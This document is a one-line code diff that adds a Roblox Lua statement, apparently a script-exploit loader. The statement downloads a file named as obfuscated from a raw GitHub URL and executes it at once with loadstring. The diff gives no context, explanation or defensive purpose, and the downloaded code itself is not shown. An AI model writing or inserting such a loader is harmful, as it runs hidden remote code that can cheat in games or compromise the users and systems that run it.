@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gather1231-source/Loader/refs/heads/main/Workspace-obfuscated.lua"))()
